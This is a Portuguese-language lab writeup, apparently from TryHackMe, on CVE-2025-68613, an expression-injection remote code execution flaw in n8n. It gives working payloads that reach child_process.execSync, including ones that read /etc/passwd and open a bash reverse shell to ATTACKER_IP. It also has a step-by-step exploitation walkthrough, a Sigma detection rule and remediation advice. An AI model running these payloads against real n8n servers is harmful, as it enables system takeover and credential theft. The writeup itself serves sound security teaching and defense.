
# CVE-2025-68613: Execu√ß√£o Remota de C√≥digo via Inje√ß√£o de Express√£o no n8n

## Vis√£o Geral

**CVE ID:** CVE-2025-68613  
**Pontua√ß√£o CVSS:** 9.9 (Cr√≠tico)  
**Plataforma:** n8n (Automa√ß√£o de Fluxo de Trabalho)  
**Vers√µes Afetadas:** 0.211.0 - 1.120.3  
**Vers√µes Corrigidas:** 1.120.4, 1.121.1, 1.122.0+  
**Data de Publica√ß√£o:** 19 de dezembro de 2025

Este writeup documenta a explora√ß√£o de uma vulnerabilidade cr√≠tica de Execu√ß√£o Remota de C√≥digo (RCE) no sistema de avalia√ß√£o de express√µes do n8n. A vulnerabilidade permite que atacantes autenticados executem comandos arbitr√°rios do sistema com os privil√©gios do processo n8n.

---

## O que √© n8n?

n8n √© uma plataforma open-source de automa√ß√£o de fluxo de trabalho que permite aos usu√°rios conectar visualmente aplica√ß√µes e servi√ßos para automa√ß√£o de tarefas. √â comumente usado para:
- Automatizar tarefas operacionais repetitivas
- Integrar ferramentas de seguran√ßa e plataformas SaaS
- Construir fluxos de trabalho complexos com mais de 400 integra√ß√µes nativas

A plataforma √© tipicamente implantada em tr√™s configura√ß√µes:
1. **Inst√¢ncias auto-hospedadas** (on-premises ou nuvem privada)
2. **Hospedagem em nuvem** (servi√ßo gerenciado n8n.cloud)
3. **Ferramentas de automa√ß√£o internas** (dentro de redes corporativas)

---

## Detalhes da Vulnerabilidade

### Contexto T√©cnico

A vulnerabilidade reside no sistema de avalia√ß√£o de express√µes do n8n, que processa entrada do usu√°rio envolvida em chaves duplas `{{ }}` como c√≥digo JavaScript. Os principais problemas s√£o:

- **Falta de sandboxing adequado** - express√µes s√£o avaliadas sem isolamento apropriado
- **Sem valida√ß√£o de entrada** - c√≥digo fornecido pelo usu√°rio √© executado diretamente
- **Escape de contexto** - atacantes podem sair do sandbox de avalia√ß√£o pretendido
- **Bypass de autentica√ß√£o** - qualquer usu√°rio autenticado pode explorar esta falha

### Como Funciona

O n8n avalia express√µes usando o contexto de execu√ß√£o do JavaScript. A vulnerabilidade permite que atacantes:

1. Acessem objetos globais do Node.js via `this`
2. Alcancem o m√≥dulo raiz da aplica√ß√£o via `process.mainModule`
3. Carreguem m√≥dulos perigosos como `child_process` via `require()`
4. Executem comandos arbitr√°rios do sistema via `execSync()`

---

## Explora√ß√£o

### Payload da Prova de Conceito

```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

### Detalhamento do Payload

Vamos analisar cada componente do exploit:

**1. Padr√£o de Fun√ß√£o An√¥nima**
```javascript
(function(){ ... })()
```
Cria e executa imediatamente uma fun√ß√£o an√¥nima para encapsular a l√≥gica do exploit.

**2. Cadeia de Escala√ß√£o de Contexto**
```javascript
this.process.mainModule
```
- `this` ‚Üí acessa o objeto global do Node.js
- `process` ‚Üí global do Node.js fornecendo acesso a processos do sistema
- `mainModule` ‚Üí referencia o m√≥dulo raiz, contornando restri√ß√µes do sandbox

**3. Carregamento de M√≥dulo**
```javascript
.require('child_process')
```
Usa o `require()` do Node.js para carregar o m√≥dulo `child_process`, que nunca deveria estar acess√≠vel para express√µes de usu√°rios.

**4. Execu√ß√£o de Comando**
```javascript
.execSync('id')
```
Executa o comando `id` de forma s√≠ncrona, que exibe informa√ß√µes de identidade do usu√°rio (UID, GID, grupos).

**5. Recupera√ß√£o de Sa√≠da**
```javascript
.toString()
```
Converte a sa√≠da Buffer do `execSync()` para uma string leg√≠vel.

---

## Explora√ß√£o Passo a Passo (Lab TryHackMe)

### Configura√ß√£o do Ambiente

- **Alvo:** `http://MACHINE_IP:5678`
- **Credenciais:**
  - Email: `tryhackme@thm.local`
  - Senha: `Try12345!`

### Passos da Explora√ß√£o

**Passo 1:** Acesse a inst√¢ncia n8n e fa√ßa login com as credenciais fornecidas

**Passo 2:** Crie um novo fluxo de trabalho
- Clique em "Start from scratch" (Come√ßar do zero)

**Passo 3:** Adicione um n√≥ Manual Trigger
- Clique em "Add first step" (Adicionar primeiro passo)
- Busque e selecione "Manual Trigger"

**Passo 4:** Adicione um n√≥ Edit Fields (Set)
- Anexe-o ao Manual Trigger
- Selecione a op√ß√£o "Edit Fields (Set)"

**Passo 5:** Injete o payload malicioso
- Clique em "Add Field" (Adicionar Campo)
- Defina o nome: `exploit` (ou qualquer nome)
- Defina o valor: 
```javascript
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

**Passo 6:** Execute e observe os resultados
- Clique em "Execute step" (Executar passo)
- A sa√≠da exibir√°: `uid=1000(node) gid=1000(node) groups=1000(node)`

### Comandos Alternativos

Voc√™ pode substituir `id` por qualquer comando do sistema:

```javascript
// Listar arquivos
{{ (function(){ return this.process.mainModule.require('child_process').execSync('ls -la').toString() })() }}

// Ler /etc/passwd
{{ (function(){ return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}

// Obter informa√ß√µes do sistema
{{ (function(){ return this.process.mainModule.require('child_process').execSync('uname -a').toString() })() }}

// Estabelecer reverse shell
{{ (function(){ return this.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"').toString() })() }}
```

---

## Detec√ß√£o e Defesa

### Detec√ß√£o com Regras Sigma

```yaml
title: Tentativa de RCE no N8N via Workflow
status: experimental
description: Detecta tentativas de injetar express√µes JavaScript em payloads de workflow n8n que executam comandos do SO
author: TryHackMe Content Engineering Team
references:
  - https://github.com/wioui/n8n-CVE-2025-68613-exploit
date: 2025-12-23
tags:
  - attack.execution
  - attack.t1059.007
logsource:
  category: webserver
  product: generic
detection:
  selection:
    cs-method: POST
    cs-uri-stem|endswith: /rest/workflows
  keywords:
    - "this.process.mainModule.require('child_process')"
    - ".execSync("
    - "={{ (function(){"
    - "toString() })()"
  condition: selection and all of keywords
falsepositives:
  - Testes de seguran√ßa / simula√ß√µes red team
  - Desenvolvedores armazenando essas strings exatas em campos logados
level: high
```

### Configura√ß√£o de Logging no Proxy

Exemplo de configura√ß√£o nginx para logar corpos de requisi√ß√£o:

```nginx
http {
    lua_package_path "/etc/nginx/lua/?.lua;;";
    
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       'Request-Body: "$request_body" '
                       'Content-Type: "$http_content_type" '
                       'Duration: $request_time s';
}
```

### Monitoramento P√≥s-Explora√ß√£o

Monitore execu√ß√µes suspeitas de processos que podem indicar explora√ß√£o:

- Estabelecimento de reverse shell
- Downloads de payloads maliciosos
- Comandos de reconhecimento (`whoami`, `id`, `uname`, `ls`, `ps`)
- Tentativas de escala√ß√£o de privil√©gios
- Atividades de movimento lateral

**Melhor Pr√°tica:** Correlacione detec√ß√µes de logs web com eventos de cria√ß√£o de processos para cobertura abrangente.

---

## Remedia√ß√£o

### A√ß√µes Imediatas

1. **Atualize imediatamente** para as vers√µes corrigidas:
   - 1.120.4
   - 1.121.1
   - 1.122.0 ou posterior

2. **Audite workflows existentes** em busca de express√µes suspeitas

3. **Revise logs de acesso** para indicadores de explora√ß√£o

4. **Implemente segmenta√ß√£o de rede** para limitar o raio de impacto

### Mitiga√ß√µes de Longo Prazo

- Habilite sandboxing adequado para avalia√ß√£o de express√µes
- Implemente valida√ß√£o e sanitiza√ß√£o de entrada
- Aplique princ√≠pio do menor privil√©gio para processos n8n
- Implante regras de Web Application Firewall (WAF)
- Monitore padr√µes an√¥malos de execu√ß√£o de workflows

---

## Principais Conclus√µes

- **Low-code n√£o significa baixo risco** - mesmo ferramentas de automa√ß√£o "amig√°veis" podem ter falhas cr√≠ticas de seguran√ßa
- **Avalia√ß√£o de express√µes requer extremo cuidado** - qualquer recurso que avalie c√≥digo de usu√°rio precisa de sandboxing robusto
- **Fronteiras de confian√ßa importam** - a vulnerabilidade decorre de isolamento fundamentalmente falho entre c√≥digo do usu√°rio e runtime da aplica√ß√£o
- **Autentica√ß√£o n√£o √© autoriza√ß√£o** - estar autenticado n√£o deve conceder acesso a comandos de n√≠vel de sistema
- **Defesa em profundidade** - combine detec√ß√£o em m√∫ltiplas camadas (logs web, monitoramento de processos, tr√°fego de rede)

---

## üîó Refer√™ncias e Ferramentas

- [Aviso de Seguran√ßa n8n](https://n8n.io/security)
- [CVE-2025-68613 PoC por wioui](https://github.com/wioui/n8n-CVE-2025-68613-exploit)
- [Documenta√ß√£o de Logging do n8n](https://docs.n8n.io/hosting/logging-monitoring/)
- [TryHackMe n8n Room](https://tryhackme.com/)
- **Burp Suite:** [PortSwigger](https://portswigger.net/burp)

---

## ‚ö†Ô∏è Aviso Legal

Este conte√∫do possui **fins exclusivamente educacionais** e foi realizado em ambiente controlado. A explora√ß√£o de vulnerabilidades em sistemas sem autoriza√ß√£o √© ilegal e pode resultar em consequ√™ncias criminais.

---

## üë§ Autor

**[iceShaher]**
- TryHackMe: [@iceShaher](https://tryhackme.com/p/iceShaher)

